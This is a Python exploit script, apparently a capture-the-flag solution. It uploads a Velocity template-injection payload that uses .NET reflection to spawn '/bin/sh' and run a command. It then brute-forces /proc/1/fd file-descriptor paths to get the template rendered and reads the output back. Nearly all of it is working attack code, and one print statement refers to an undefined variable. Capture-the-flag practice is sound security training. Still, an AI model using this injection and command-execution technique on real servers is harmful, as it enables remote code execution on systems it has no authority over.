import requests
import tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed


def build_payload():
    return r"""
#set($dummy = "")
dummy = $dummy

#set($alcType  = $dummy.GetType().Assembly.GetType("System.Runtime.Loader.AssemblyLoadContext"))
alcType = $alcType

#set($alc = $alcType.GetProperty("Default").GetValue($null))
alc = $alc

#set($procAsm = $alc.LoadFromAssemblyPath("/usr/share/dotnet/shared/Microsoft.NETCore.App/8.0.17/System.Diagnostics.Process.dll"))
procAsm = $procAsm

#set($procType = $procAsm.GetType("System.Diagnostics.Process", true))
procType = $procType

#set($psi = $procType.GetProperty("StartInfo"))
psi = $psi

#set($psiType = $psi.PropertyType)
psiType = $psiType

#set($stringType = $dummy.GetType())
stringType = $stringType

#set($startMethod = "")
#foreach($m in $procType.GetMethods())#set($ps=$m.GetParameters())#if($m.Name=="Start"&&$m.IsStatic&&$ps.Count==2&&$ps.GetValue(0).ParameterType.FullName=="System.String"&&$ps.GetValue(1).ParameterType.FullName=="System.String")#set($startMethod=$m)#end#end
startMethod = $startMethod

#set($argList = [])
$argList.Add("/bin/sh")
$argList.Add("-c /readflag>/tmp/flag.txt")
#set($args = $argList.ToArray())

#set($proc = $startMethod.Invoke($null, $args))
$proc
""".strip().encode()


def try_fd(upload_url, fd):
    vtl_payload = build_payload()
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(b"\n" + vtl_payload + b"\n")
        tmp.write(b"A" * int(1024 * 1024 * .1))
        tmp.flush()
        tmp.seek(0)

        files = {
            'file': ('exploit.vm', tmp, 'application/octet-stream')
        }

        template_path = f"/proc/1/fd/{fd}"
        print(f"[*] Trying {fd} using {template_path}")
        try:
            response = requests.post(upload_url, files=files, data={"template": template_path}, timeout=1)
        except requests.exceptions.RequestException:
            print(f"[!] PID {pid}: Request failed.")


if __name__ == "__main__":
    upload_url = "https://etaas-79be77b9a8a083ea.instancer.challs.mt/"

    fds = range(100, 256)

    with ThreadPoolExecutor(max_workers=16) as executor:
        futures = {executor.submit(try_fd, upload_url, fd): fd for fd in fds}

        for future in as_completed(futures):
            pid = futures[future]
        print("All attempts finished.")

    req = requests.post(upload_url, data={"template": "/tmp/flag.txt"})
    print("flag: ", req.text)
